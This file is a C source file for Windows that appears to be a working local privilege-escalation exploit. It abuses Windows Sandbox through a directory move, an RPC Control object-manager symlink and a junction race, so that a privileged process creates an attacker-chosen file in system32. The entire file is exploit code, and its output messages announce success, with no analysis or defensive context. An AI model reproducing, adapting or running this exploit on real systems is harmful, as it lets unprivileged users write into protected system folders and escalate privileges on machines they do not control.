#include "def.h"


int wmain(int argc, wchar_t** argv) {

    WIN32_FIND_DATA ffd;
    WCHAR dir[256] = { 0x0 };
    WCHAR dirtodel[256] = { 0x0 };
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);

    load();
    HANDLE hFind = FindFirstFile(L"C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\*", &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot list directory!\n");
        return -1;
    }
    do {
        if ((ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && (wcswcs(ffd.cFileName, L"-")))
        {
            swprintf(dir,L"C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\%s\\BaseLayer",ffd.cFileName);
            swprintf(dirtodel, L"C:\\ProgramData\\Microsoft\\Windows\\Containers\\BaseImages\\%s\\BaseLayer\\Bindings", ffd.cFileName);
            break;
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    printf("[*] Directory to delete: %ls\n", dirtodel);
    hDir = CreateFile(dirtodel, DELETE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open handle on directory!\n");
        return -1;
    }
    if (!Move(hDir)) {
        printf("[!] Cannot move directory!\n");
        return -1;
    }
    printf("[+] Directory moved!\n");
    CloseHandle(hDir);
    DosDeviceSymLink(L"Global\\GLOBALROOT\\RPC Control\\Entries", L"\\??\\c:\\windows\\system32\\pwn");
    if (!CreateProcessW(L"C:\\windows\\system32\\windowssandbox.exe",NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("[!] Cannot start process!\n");
        return -1;
    }
    do {
        hFile = CreateFile(dirtodel, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    } while (hFile == INVALID_HANDLE_VALUE);
    CreateJunction(hFile, L"\\RPC Control");
     
    HANDLE success;
    do {
        Sleep(1000);
        success = CreateFile(L"C:\\windows\\system32\\pwn", FILE_WRITE_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    }while (success == INVALID_HANDLE_VALUE);
    printf("[+] Exploit successful!\n");
    DeleteJunction(hFile);

}
BOOL Move(HANDLE hFile) {
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Invalid handle!\n");
        return FALSE;
    }
    wchar_t tmpfile[MAX_PATH] = { 0x0 };
    RPC_WSTR str_uuid;
    UUID uuid = { 0 };
    UuidCreate(&uuid);
    UuidToString(&uuid, &str_uuid);
    _swprintf(tmpfile, L"\\??\\C:\\windows\\temp\\%s", str_uuid);
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(tmpfile) * sizeof(wchar_t));
    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);
    IO_STATUS_BLOCK io = { 0 };
    rename_info->ReplaceIfExists = TRUE;
    rename_info->RootDirectory = NULL;
    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;
    rename_info->FileNameLength = wcslen(tmpfile) * sizeof(wchar_t);
    memcpy(&rename_info->FileName[0], tmpfile, wcslen(tmpfile) * sizeof(wchar_t));
    NTSTATUS status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (status != 0) {
        return FALSE;
    }
    return TRUE;
}
void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");
    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL || pNtSetInformationFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }

}
BOOL CreateJunction(HANDLE hDir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {

        GetFinalPathNameByHandle(hDir, dir, MAX_PATH, 0);
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {

        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(HANDLE handle) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    IO_STATUS_BLOCK io;
    if (handle == INVALID_HANDLE_VALUE) {
        printf("[!] HANDLE invalid!\n");
        return FALSE;
    }
    WCHAR dir[MAX_PATH] = { 0x0 };
    if (DeviceIoControl(handle, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL)) {
        GetFinalPathNameByHandle(handle, dir, MAX_PATH, 0);
        printf("[+] Junction %ls deleted!\n", dir);
        return TRUE;
    }
    else
    {
        printf("[!] Error: %d.\n", GetLastError());
        return FALSE;
    }
}

BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}

BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}